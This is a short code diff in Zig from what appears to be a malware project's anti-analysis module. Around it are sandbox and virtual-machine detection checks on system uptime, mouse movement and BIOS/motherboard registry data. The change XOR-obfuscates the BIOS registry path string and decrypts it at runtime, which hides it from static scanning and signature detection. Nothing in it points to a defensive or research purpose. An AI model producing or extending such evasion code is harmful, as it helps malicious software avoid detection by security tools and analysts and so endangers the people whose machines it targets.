@@ -32,6 +32,10 @@ pub fn checkUptime() ?bool {
     return (ms / (1000 * 60)) < 30;
 }
 
+const E = struct {
+    pub const bios_reg_path = hash.xorEncrypt("\\Registry\\Machine\\HARDWARE\\DESCRIPTION\\System\\BIOS");
+};
+
 const POINT = extern struct { x: i32, y: i32 };
 
 pub fn checkMouseMovement() ?bool {
@@ -124,7 +128,9 @@ const SYSTEMTIME = extern struct {
 };
 
 pub fn collectMotherboardInfo() ?[]const u8 {
-    const reg_path = "\\Registry\\Machine\\HARDWARE\\DESCRIPTION\\System\\BIOS";
+    var path_buf: [E.bios_reg_path.len]u8 = undefined;
+    hash.xorDecrypt(&E.bios_reg_path, &path_buf);
+    const reg_path = &path_buf;
     var us_buf: [512]u16 = undefined;
     for (reg_path, 0..) |c, i| us_buf[i] = c;
     var us = types.UNICODE_STRING{
